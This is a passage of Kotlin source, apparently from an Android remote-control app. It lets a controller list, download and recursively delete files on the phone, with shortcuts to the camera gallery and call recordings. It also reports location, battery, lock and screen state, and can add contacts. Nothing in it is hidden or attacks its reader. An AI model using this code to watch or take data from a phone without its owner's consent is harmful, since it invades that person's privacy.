        val mark = SettingUtils.extraDeviceMark
        val name = if (mark.isNotBlank()) mark else "${Build.MANUFACTURER} ${Build.MODEL}".trim()
        // 锁屏状态
        var locked = false
        try {
            val km = ctx.getSystemService(KeyguardManager::class.java)
            if (km != null) {
                locked = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) km.isKeyguardLocked else false
            }
        } catch (e: Exception) {
            Log.w(TAG, "读取锁屏状态失败: ${e.message}")
        }
        // 屏幕状态
        var screenOn = false
        try {
            val pm = ctx.getSystemService(PowerManager::class.java)
            if (pm != null) {
                screenOn = pm.isInteractive
            }
        } catch (e: Exception) {
            Log.w(TAG, "读取屏幕状态失败: ${e.message}")
        }
        // 电量与充电状态
        var battery = -1
        var charging = 0
        try {
            val filter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
            val batteryIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                ctx.registerReceiver(null, filter, Context.RECEIVER_EXPORTED)
            } else {
                @Suppress("DEPRECATION")
                ctx.registerReceiver(null, filter)
            }
            if (batteryIntent != null) {
                val status = batteryIntent.getIntExtra(BatteryManager.EXTRA_STATUS, BatteryManager.BATTERY_STATUS_UNKNOWN)
                val plugged = batteryIntent.getIntExtra(BatteryManager.EXTRA_PLUGGED, 0)
                battery = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
                charging = if (status == BatteryManager.BATTERY_STATUS_CHARGING || plugged != 0) 1 else 0
            }
        } catch (e: Exception) {
            Log.w(TAG, "读取电量失败: ${e.message}")
        }
        return "$name|${if (locked) 1 else 0}|${if (screenOn) 1 else 0}|$battery|$charging"
    }

    private fun <T> parseData(json: String, clazz: Class<T>): T? {
        if (json.isEmpty()) return null
        return try {
            gson.fromJson(json, clazz)
        } catch (e: Exception) {
            null
        }
    }

    /** 解析归一化坐标负载 "x|y"（0.0~1.0），非法返回 (0,0) */
    private fun parseCoords(text: String): Pair<Float, Float> {
        val parts = text.trim().split("|")
        if (parts.size < 2) return 0f to 0f
        val x = parts[0].toFloatOrNull()?.coerceIn(0f, 1f) ?: 0f
        val y = parts[1].toFloatOrNull()?.coerceIn(0f, 1f) ?: 0f
        return x to y
    }

    /**
     * 触摸服务可用性检查：无障碍服务未开启时返回错误响应（明确原因提示控制端）
     * @return null=服务可用；非null=错误响应(命令, JSON)
     */
    private fun touchUnavailable(): Pair<String, String>? {
        return if (TouchControlService.instance == null) {
            RelayCommands.RSP_ERROR to error("被控端未开启远程触摸（无障碍）服务，请在系统设置-无障碍中开启后重试")
        } else {
            null
        }
    }

    /** 处理配置查询（卡槽信息等），★ 2026-08-15 通话录音设置项已随功能整体移除 */
    private fun handleConfig(): ConfigData {
        // 获取卡槽信息
        if (App.SimInfoList.isEmpty()) {
            App.SimInfoList = PhoneUtils.getSimMultiInfo()
        }
        return ConfigData(
            HttpServerUtils.enableApiClone,
            false,
            HttpServerUtils.enableApiSmsQuery,
            HttpServerUtils.enableApiCallQuery,
            HttpServerUtils.enableApiContactQuery,
            HttpServerUtils.enableApiContactAdd,
            HttpServerUtils.enableApiBatteryQuery,
            // ★ 2026-08-10 删除WOL功能：字段保留(兼容旧版控制端JSON解析)，值固定为 false
            false,
            HttpServerUtils.enableApiLocation,
            SettingUtils.extraDeviceMark,
            SettingUtils.extraSim1,
            SettingUtils.extraSim2,
            App.SimInfoList,
            AppUtils.getAppVersionCode(),
            AppUtils.getAppVersionName(),
        )
    }

    private fun handleBattery(): BatteryInfo {
        val intentFilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        val intent: Intent? = App.context.registerReceiver(null, intentFilter)
        return BatteryUtils.getBatteryInfo(intent)
    }

    // ==================== 文件系统（2026-08-06新增） ====================

    /** 默认根目录：/storage/emulated/0（Download目录的父目录） */
    private val FS_DEFAULT_ROOT = "/storage/emulated/0"

    /** 图库目录：根目录顶部"图库"条目点击后直接进入的目录（手机相机相册，与系统相册一致） */
    private val FS_GALLERY_DIR = "/storage/emulated/0/DCIM/Camera"

    /**
     * ★ 2026-08-11 查找手机自带"录音机"App保存录音文件的目录（取第一个存在，用于根目录"录音"快捷入口）
     * 优先MIUI录音机（红米/小米），其次标准MediaStore录音目录、本App通话录音保存目录
     */
    private fun findRecordingsDir(): String {
        val candidates = listOf(
            "/storage/emulated/0/MIUI/sound_recorder/call_rec",   // MIUI 录音机-通话录音
            "/storage/emulated/0/MIUI/sound_recorder",            // MIUI 录音机
            "/storage/emulated/0/Music/Recordings/CallRecord",    // 本App通话录音(MediaStore)
            "/storage/emulated/0/Recordings/CallRecord",          // 标准通话录音目录
            "/storage/emulated/0/Recordings",                     // 标准录音目录(Android 10+)
            "/storage/emulated/0/Recorder",                       // 部分ROM录音机
        )
        for (c in candidates) {
            if (File(c).exists()) return c
        }
        return "/storage/emulated/0/Recordings"
    }

    /**
     * 过滤系统/隐藏/无权限目录：隐藏目录(.开头)、Android系统目录、不可读目录
     * 根目录下不显示这些目录，避免用户误操作或看到无意义的系统目录
     */
    private fun isFsVisibleDir(f: File): Boolean {
        if (f.isHidden) return false
        if (f.name == "Android") return false
        return f.canRead()
    }

    /**
     * 列目录：负载=目录路径（空=默认根 /storage/emulated/0）
     * 根目录列表最前面插入"图库"特殊条目（点击直接进入图库目录）
     * @return JSON数组字符串 [{name,type,size,mtime,path},...]，type=D目录/F文件
     */
    private fun handleFsList(path: String): String {
        val dir = if (path.trim().isEmpty()) FS_DEFAULT_ROOT else path.trim()
        val file = File(dir)
        if (!file.exists() || !file.isDirectory) {
            return "[]"
        }
        val list = ArrayList<Map<String, Any>>()
        // ★ 根目录顶部固定顺序（2026-08-11）：Download、图库、Pictures、录音，其余目录按字母排序在后
        val rootFixed = file.absolutePath == FS_DEFAULT_ROOT
        val rootFixedNames = HashSet<String>()
        if (rootFixed) {
            // 第1行：Download（Download的父目录即根目录）
            val dl = File(FS_DEFAULT_ROOT, "Download")
            if (dl.exists() && dl.isDirectory) {
                list.add(linkedMapOf(
                    "name" to "Download",
                    "type" to "D",
                    "size" to 0L,
                    "mtime" to dl.lastModified(),
                    "path" to dl.absolutePath
                ))
                rootFixedNames.add("Download")
            }
            // 第2行：图库（点击直接进入图库目录）
            list.add(linkedMapOf(
                "name" to "图库",
                "type" to "D",
                "size" to 0L,
                "mtime" to 0L,
                "path" to FS_GALLERY_DIR
            ))
            // 第3行：Pictures（放到图库下面）
            val pic = File(FS_DEFAULT_ROOT, "Pictures")
            if (pic.exists() && pic.isDirectory) {
                list.add(linkedMapOf(
                    "name" to "Pictures",
                    "type" to "D",
                    "size" to 0L,
                    "mtime" to pic.lastModified(),
                    "path" to pic.absolutePath
                ))
                rootFixedNames.add("Pictures")
            }
            // 第4行：录音（快捷打开手机自带录音机目录，查找通话录音文件）
            val recDir = findRecordingsDir()
            val recFile = File(recDir)
            list.add(linkedMapOf(
                "name" to "录音",
                "type" to "D",
                "size" to 0L,
                "mtime" to if (recFile.exists()) recFile.lastModified() else 0L,
                "path" to recDir
            ))
        }
        try {
            val children = file.listFiles()
            if (children != null) {
                // 正常路径：listFiles() 可用
                children.filter { it.isDirectory && isFsVisibleDir(it) && !rootFixedNames.contains(it.name) }
                    .sortedBy { it.name.lowercase() }.forEach {
                    list.add(linkedMapOf(
                        "name" to it.name,
                        "type" to "D",
                        "size" to 0L,
                        "mtime" to it.lastModified(),
                        "path" to it.absolutePath
                    ))
                }
                children.filter { it.isFile }.sortedBy { it.name.lowercase() }.forEach {
                    list.add(linkedMapOf(
                        "name" to it.name,
                        "type" to "F",
                        "size" to it.length(),
                        "mtime" to it.lastModified(),
                        "path" to it.absolutePath
                    ))
                }
            } else {
                // ★ Fallback：listFiles() 返回 null（scoped storage 限制）
                // Android 11+ targetSdk 30+ 下，File.listFiles() 对其他应用创建的文件返回 null
                // 使用 ls -la 命令列目录，ls 通过 POSIX readdir() 访问文件系统
                Log.w(TAG, "listFiles()返回null(scoped storage限制): $dir, isExternalStorageManager=${android.os.Environment.isExternalStorageManager()}")
                val lsItems = listFilesWithLs(dir)
                // 根目录时过滤已固定前置的条目，避免重复
                val lsFiltered = if (rootFixed) lsItems.filter { !rootFixedNames.contains(it["name"]) } else lsItems
                // 排序：目录在前、文件在后，各自按名称排序
                lsFiltered.sortedWith(compareBy(
                    { if (it["type"] == "D") 0 else 1 },
                    { (it["name"] as String).lowercase() }
                )).forEach { list.add(it) }
            }
        } catch (e: Exception) {
            Log.w(TAG, "列目录异常: $dir ${e.message}")
        }
        return fsJson(list)
    }

    private fun fsJson(list: List<Map<String, Any>>): String {
        return try {
            gson.toJson(list)
        } catch (e: Exception) {
            "[]"
        }
    }

    /**
     * ls命令fallback：当File.listFiles()因scoped storage返回null时，
     * 使用ls -la命令列目录。ls通过POSIX readdir()访问文件系统，
     * 在MIUI等定制系统上可能比Java File API有更广泛的访问权限。
     */
    private fun listFilesWithLs(dir: String): List<Map<String, Any>> {
        val result = ArrayList<Map<String, Any>>()
        try {
            val proc = Runtime.getRuntime().exec(arrayOf("ls", "-la", dir))
            val output = proc.inputStream.bufferedReader().readText()
            val errOut = proc.errorStream.bufferedReader().readText()
            proc.waitFor(5, java.util.concurrent.TimeUnit.SECONDS)

            if (errOut.isNotEmpty()) {
                Log.w(TAG, "ls stderr: $errOut")
            }

            // 正则匹配 ls -la 输出行：permissions links owner group size date time filename
            // 兼容不同日期格式（YYYY-MM-DD HH:MM 或 MMM DD HH:MM）
            val regex = Regex("^([ldrwxstST-]{10})\\s+\\d+\\s+\\S+\\s+\\S+\\s+(\\d+)\\s+\\S+\\s+\\S+\\s+(.+)$")

            for (line in output.lines()) {
                if (line.isBlank() || line.startsWith("total ")) continue
                val m = regex.find(line.trim()) ?: continue

                val perms = m.groupValues[1]
                val isDir = perms.startsWith("d")
                val size = m.groupValues[2].toLongOrNull() ?: 0L
                val name = m.groupValues[3].trim()

                if (name == "." || name == "..") continue

                // 应用与 isFsVisibleDir 相同的目录过滤规则
                if (isDir) {
                    if (name.startsWith(".")) continue  // 隐藏目录
                    if (name == "Android") continue     // Android系统目录
                }

                val path = File(dir, name).absolutePath
                result.add(linkedMapOf(
                    "name" to name,
                    "type" to if (isDir) "D" else "F",
                    "size" to if (isDir) 0L else size,
                    "mtime" to 0L,
                    "path" to path
                ))
            }
            Log.i(TAG, "ls fallback: $dir 找到 ${result.size} 项")
        } catch (e: Exception) {
            Log.w(TAG, "ls fallback失败: $dir ${e.message}")
        }
        return result
    }

    /**
     * 删除文件/目录（目录递归删除）
     * @return "1|success|信息" 或 "0|failed|原因"
     */
    private fun handleFsDelete(path: String): String {
        val p = path.trim()
        if (p.isEmpty()) return "0|failed|路径为空"
        val f = File(p)
        if (!f.exists()) return "0|failed|文件或目录不存在"
        if (p == FS_DEFAULT_ROOT || p == FS_GALLERY_DIR || p == "/") {
            return "0|failed|系统目录不允许删除"
        }
        return try {
            if (deleteRecursively(f)) "1|success|删除成功" else "0|failed|删除失败"
        } catch (e: Exception) {
            Log.w(TAG, "删除失败: $p ${e.message}")
            "0|failed|${e.message ?: "删除失败"}"
        }
    }

    private fun deleteRecursively(f: File): Boolean {
        return if (f.isDirectory) {
            val children = f.listFiles() ?: return f.delete()
            for (c in children) {
                if (!deleteRecursively(c)) return false
            }
            f.delete()
        } else {
            f.delete()
        }
    }

    /**
     * ★ 列目录（同步发送版）：生成JSON后通过sendSync可靠写入socket。
     * 参照文件下载的可靠发送逻辑：目录JSON较大时异步send可能因中继拥塞被丢弃，
     * 导致控制端20秒超时报"列目录失败"。同步发送+失败重试（最多2次）。
     */
    private fun startFsList(path: String, sender: RelaySender?) {
        if (sender == null) {
            Log.w(TAG, "列目录失败: sender为空")
            return
        }
        try {
            val json = handleFsList(path)
            // ★ 同步发送：等待实际写入socket+flush成功（参照下载分块的sendSync）
            var ok = sender.sendSync(RelayCommands.RSP_FS_LIST, json.toByteArray(Charsets.UTF_8), 15000)
            if (!ok) {
                // 发送失败：等待重连后重试一次
                Log.w(TAG, "列目录: 同步发送失败，等待重连后重试... (路径=$path)")
                if (waitForConnection(sender, 15000)) {
                    ok = sender.sendSync(RelayCommands.RSP_FS_LIST, json.toByteArray(Charsets.UTF_8), 15000)
                }
            }
            if (!ok) {
                Log.w(TAG, "列目录: 重试仍失败 (路径=$path, JSON大小=${json.length})")
            }
        } catch (e: Exception) {
            Log.w(TAG, "列目录异常: $path ${e.message}")
        }
    }

    /**
     * 启动文件下载（后台线程）：RSP_FS_GET(大小|文件名|状态) → CMD_FS_DATA分块(128KB) → CMD_FS_DONE
     * 通过命令来源通道sender（中继client/直连listener/TS直连）推送数据。
     *
     * ★ 2026-08-06 大文件下载稳定性修复（参考PC端微信_download_send_file_blocked，经过长期测试）：
     *   1) 同步发送：每块用sendSync等待实际写入完成+flush成功，失败立即判定（不再异步假活）
     *   2) 流控50ms：每块后sleep 50ms（与微信下载一致），避免TCP缓冲区压力过大
     *   3) 等待重连时主动发心跳：waitForConnection内每秒发一次CMD_PING，刷新NAT映射
     *   4) 进度日志：每10块/每10%/最后一块打印进度，便于调试定位卡顿点
     *   5) CMD_FS_DONE也用同步发送，确保"完成"标记一定到达控制端
     */
    private fun startFsDownload(path: String, sender: RelaySender?) {
        if (sender == null) {
            Log.w(TAG, "文件下载失败: sender为空，无法推送数据")
            return
        }
        val p = path.trim()
        val f = File(p)
        if (!f.exists()) {
            sender.send(RelayCommands.RSP_FS_GET, "0||not_found")
            return
        }
        if (f.isDirectory) {
            sender.send(RelayCommands.RSP_FS_GET, "0||error")
            return
        }
        // ★★★ 下载互斥：同一时间只允许一个下载线程（2026-08-07致命修复）
        //   根因：旧下载（控制端超时但未发CANCEL）线程仍在等ACK重发死循环，
        //   新下载启动后两个线程并发写同一socket → 数据帧交错 → ACK全部丢失 → 下载卡死
        //   方案：新下载先取消旧线程并等待其退出，再启动新线程。
        //   ★ 互斥等待放在下载线程内执行，避免阻塞命令处理线程（否则ACK无法送达旧线程）
        // ★ 重置取消标志（每次新下载前清除上次的取消状态）
        fsDownloadCancelled = false
        // ★ 每个下载会话独立的ACK序号（互斥后不会互相覆盖）
        fsAckBlock = -1
        // ★ 连续ACK超时重发计数：超过上限自动放弃（防止控制端离线后线程永久重发占用连接）
        val maxConsecutiveRetries = 5
        val t = Thread({
            try {
                // ★ 下载线程内部互斥：取消旧下载线程并等待其退出（不阻塞命令处理线程）
                val oldThread = fsDownloadThread
                if (oldThread != null && oldThread.isAlive) {
                    Log.w(TAG, "★ 检测到旧下载线程仍在运行，先取消旧下载 (新文件=$p)")
                    fsDownloadCancelled = true
                    try {
                        oldThread.join(3000)
                    } catch (e: InterruptedException) {
                        // ignore
                    }
                    if (oldThread.isAlive) {
                        Log.w(TAG, "★ 旧下载线程3秒内未退出（可能阻塞在sendSync），继续启动新下载")
                    } else {
                        Log.i(TAG, "★ 旧下载线程已退出，开始新下载")
                    }
                }
                fsDownloadCancelled = false
                var consecutiveRetries = 0
                val total = f.length()
                // ★ 等待连接就绪后再发送元信息（连接断开时等待重连，最多30秒）
                if (!waitForConnection(sender, 30000)) {
                    Log.w(TAG, "文件下载取消: 连接未恢复 $p")
                    return@Thread
                }
                // ★ 元信息(RSP_FS_GET)也同步发送，确保控制端一定收到才能显示进度条
                Log.i(TAG, "[FS调试] 发送元信息 $total|${f.name}|ok time=${System.currentTimeMillis()}")
                if (!sender.sendSync(RelayCommands.RSP_FS_GET, "$total|${f.name}|ok".toByteArray(Charsets.UTF_8), 15000)) {
                    Log.w(TAG, "文件下载: 发送元信息失败 $p")
                    return@Thread
                }
                val buf = ByteArray(128 * 1024)
                var sentBytes = 0L
                var blockIdx = 0
                var lastLogProgress = -1
                // ★ 分块确认：控制端每收到一块回ACK(块序号)，被控端等待确认后才发送下一块
                //   参照PC端微信_download_send_file_blocked：发送→等待ACK→确认后继续
                //   防止中继→控制端链路拥塞时盲目高速发送导致数据堆积丢失
                f.inputStream().use { ins ->
                    while (true) {
                        // ★ 检查取消标志：控制端发送CMD_FS_CANCEL后，立即停止读取和发送
                        if (fsDownloadCancelled) {
                            Log.i(TAG, "文件下载被取消: $p (已发送 $sentBytes/$total bytes, 块$blockIdx)")
                            return@Thread
                        }
                        val n = ins.read(buf)
                        if (n <= 0) break
                        val chunk = if (n == buf.size) buf else buf.copyOf(n)
                        // ★ 数据块负载加4字节大端块序号前缀（供控制端去重，防止ACK丢失重发导致重复写盘）
                        val framedChunk = java.nio.ByteBuffer.allocate(4 + chunk.size)
                            .putInt(blockIdx).put(chunk).array()
                        // ★ 每块发送前检查连接状态：断线时等待重连（最多30秒，等待期间主动发心跳刷NAT）
                        if (!sender.isConnected()) {
                            Log.w(TAG, "文件下载: 连接中断，等待重连... (已发送 $sentBytes/$total, 块$blockIdx)")
                            if (!waitForConnection(sender, 30000)) {
                                Log.w(TAG, "文件下载中止: 重连超时 $p (已发送 $sentBytes/$total, 块$blockIdx)")
                                return@Thread
                            }
                        }
                        // ★ 同步发送：等待实际写入socket+flush成功，返回false立即失败处理
                        val sendT0 = System.currentTimeMillis()
                        val sendOk = sender.sendSync(RelayCommands.CMD_FS_DATA, framedChunk, 20000)
                        val sendCost = System.currentTimeMillis() - sendT0
                        if (sendOk) {
                            // ★ 调试：每块记录发送耗时与累计进度（写入文件，定位停滞丢包环节）
                            val pct = if (total > 0) (sentBytes * 100 / total).toInt() else 0
                            Log.i(TAG, "[FS调试] 块$blockIdx 发送OK 耗时${sendCost}ms 块大小${chunk.size} 累计$sentBytes/$total($pct%) 连接=${sender.isConnected()}")
                        } else {
                            // 发送失败：可能连接半开，尝试等待重连一次再发
                            Log.w(TAG, "文件下载: 块$blockIdx 同步发送失败，等待重连后重试... (已发送 $sentBytes/$total)")
                            if (!waitForConnection(sender, 30000)) {
                                Log.w(TAG, "文件下载中止: 块$blockIdx 重连后仍发送失败 $p")
                                return@Thread
                            }
                            // 重连后重试一次该块（失败则退出）
                            if (!sender.sendSync(RelayCommands.CMD_FS_DATA, framedChunk, 20000)) {
                                Log.w(TAG, "文件下载中止: 块$blockIdx 重试失败 $p")
                                return@Thread
                            }
                        }
                        // ★ 等待控制端ACK确认本块（最多15秒，参照PC微信wait_for_block_ack 60s的缩版）
                        //   未确认说明中继→控制端链路拥塞/断开，不能继续发送下一块（否则数据堆积丢失）
                        val ackDeadline = System.currentTimeMillis() + 15000
                        var ackGot = false
                        while (System.currentTimeMillis() < ackDeadline) {
                            if (fsDownloadCancelled) {
                                Log.i(TAG, "文件下载被取消(等ACK): $p (块$blockIdx)")
                                return@Thread
                            }
                            if (fsAckBlock >= blockIdx) {
                                ackGot = true
                                break
                            }
                            Thread.sleep(50)
                        }
                        if (!ackGot) {
                            // ★ ACK超时：可能(1)链路拥塞ACK在途延迟 (2)数据未到达控制端。
                            //   先等待连接恢复并额外等待15秒让延迟ACK到达，避免重复写盘；
                            //   仍无ACK才判定数据丢失，重发该块（与PC微信ACK重试一致）。
                            Log.w(TAG, "文件下载: 块$blockIdx ACK超时(15s)，等待连接恢复与延迟ACK... (已发送 $sentBytes/$total)")
                            val connOk = waitForConnection(sender, 30000)
                            if (!connOk) {
                                Log.w(TAG, "文件下载中止: 块$blockIdx ACK超时且连接未恢复 $p")
                                return@Thread
                            }
                            // 连接恢复后再等待15秒（延迟ACK可能已在中继队列）
                            val ack2Deadline = System.currentTimeMillis() + 15000
                            var ack2Got = false
                            while (System.currentTimeMillis() < ack2Deadline) {
                                if (fsDownloadCancelled) {
                                    Log.i(TAG, "文件下载被取消(等延迟ACK): $p (块$blockIdx)")
                                    return@Thread
                                }
                                if (fsAckBlock >= blockIdx) {
                                    ack2Got = true
                                    break
                                }
                                Thread.sleep(50)
                            }
                            if (!ack2Got) {
                                // 数据块确认丢失：重发该块（控制端未收到才可能发生，写盘不会重复）
                                consecutiveRetries++
                                if (consecutiveRetries >= maxConsecutiveRetries) {
                                    Log.w(TAG, "文件下载中止: 块$blockIdx 连续${consecutiveRetries}次ACK超时（控制端可能已离线），自动放弃 $p")
                                    return@Thread
                                }
                                Log.w(TAG, "文件下载: 块$blockIdx 数据确认丢失，重发该块... (已发送 $sentBytes/$total, 连续${consecutiveRetries}次)")
                                if (!sender.sendSync(RelayCommands.CMD_FS_DATA, framedChunk, 20000)) {
                                    Log.w(TAG, "文件下载中止: 块$blockIdx ACK超时后重发失败 $p")
                                    return@Thread
                                }
                                Log.i(TAG, "文件下载: 块$blockIdx 重发OK")
                            } else {
                                consecutiveRetries = 0
                                Log.i(TAG, "文件下载: 块$blockIdx 延迟ACK已到达")
                            }
                        } else {
                            consecutiveRetries = 0
                            Log.i(TAG, "[FS调试] 块$blockIdx 已确认(ACK)")
                        }
                        sentBytes += n
                        blockIdx++
                        // ★ 进度日志（每10块 或 每10% 或 最后一块），参考微信下载的调试能力
                        val progress = if (total > 0) (sentBytes * 100 / total).toInt() else 0
                        if (blockIdx % 10 == 0 || progress >= lastLogProgress + 10 || sentBytes >= total) {
                            lastLogProgress = progress
                            Log.i(TAG, "文件下载进度: $p 块$blockIdx, $sentBytes/$total bytes ($progress%)")
                        }
                        // ★ 流控延迟50ms（与PC端微信下载_send_file_blocked一致），
                        //   让出CPU+避免TCP发送缓冲区积压过多数据导致ACK超时
                        Thread.sleep(50)
                    }
                }
                // ★ 等待连接就绪后再同步发送完成标记（确保控制端收到后关闭进度条）
                if (!waitForConnection(sender, 30000)) {
                    Log.w(TAG, "文件下载完成但连接断开，无法发送完成标记: $p")
                    return@Thread
                }
                if (!sender.sendSync(RelayCommands.CMD_FS_DONE, ByteArray(0), 15000)) {
                    Log.w(TAG, "文件下载: 发送完成标记CMD_FS_DONE失败 $p")
                    return@Thread
                }
                Log.i(TAG, "fs download done: $p ($total bytes, $blockIdx blocks)")
            } catch (e: Exception) {
                Log.w(TAG, "文件下载异常: $p ${e.message}")
                try {
                    sender.send(RelayCommands.RSP_FS_GET, "0||error")
                } catch (ignored: Exception) {
                }
            } finally {
                // ★ 清除当前下载线程引用（互斥锁释放，允许下一次下载）
                if (fsDownloadThread === Thread.currentThread()) {
                    fsDownloadThread = null
                }
            }
        }, "FsDownload").apply {
            isDaemon = true
            fsDownloadThread = this
        }.start()
    }

    /**
     * ★ 等待sender连接就绪（用于文件下载断线重连），返回是否在超时内恢复。
     *   等待期间每秒主动发送一次CMD_PING心跳（即使失败也无害），
     *   一旦连接恢复立即触发出站数据，刷新运营商NAT映射防止静默断连。
     */
    private fun waitForConnection(sender: RelaySender?, timeoutMs: Long): Boolean {
        if (sender == null) return false
        if (sender.isConnected()) return true
        Log.w(TAG, "[FS调试] waitForConnection 开始等待连接恢复 timeout=${timeoutMs}ms time=${System.currentTimeMillis()}")
        val deadline = System.currentTimeMillis() + timeoutMs
        while (System.currentTimeMillis() < deadline) {
            try {
                Thread.sleep(1000)
            } catch (_: InterruptedException) {
                return false
            }
            // ★ 每1秒尝试发送一次心跳：恢复的瞬间立刻有出站数据，刷新NAT映射
            try {
                sender.send(RelayCommands.CMD_PING, "ping")
            } catch (_: Exception) {
            }
            if (sender.isConnected()) {
                Log.i(TAG, "[FS调试] waitForConnection 连接已恢复 time=${System.currentTimeMillis()}")
                return true
            }
        }
        Log.w(TAG, "[FS调试] waitForConnection 等待超时")
        return false
    }

    private fun handleLocation(): LocationInfo {
        return HttpServerUtils.apiLocationCache
    }

    private fun handleContactAdd(contactData: ContactInfo) {
        // 创建一个空的ContentValues
        val values = ContentValues()
        // 首先向RawContacts.CONTENT_URI执行一个空值插入，目的是获取系统返回的rawContactId
        val rawcontacturi = XUtil.getContentResolver().insert(ContactsContract.RawContacts.CONTENT_URI, values)
        val rawcontactid = ContentUris.parseId(rawcontacturi!!)

        // 插入姓名数据
        values.clear()
        values.put(ContactsContract.Data.RAW_CONTACT_ID, rawcontactid)
        values.put(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE)
        values.put(ContactsContract.CommonDataKinds.StructuredName.GIVEN_NAME, contactData.name)
        XUtil.getContentResolver().insert(ContactsContract.Data.CONTENT_URI, values)

        // 插入电话数据
        for (phoneNumber in contactData.phoneNumber.split(";")) {
            values.clear()
            values.put(ContactsContract.Data.RAW_CONTACT_ID, rawcontactid)
            values.put(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE)
            values.put(ContactsContract.CommonDataKinds.Phone.NUMBER, phoneNumber)
            values.put(ContactsContract.CommonDataKinds.Phone.TYPE, ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE)
            XUtil.getContentResolver().insert(ContactsContract.Data.CONTENT_URI, values)
        }
    }
}
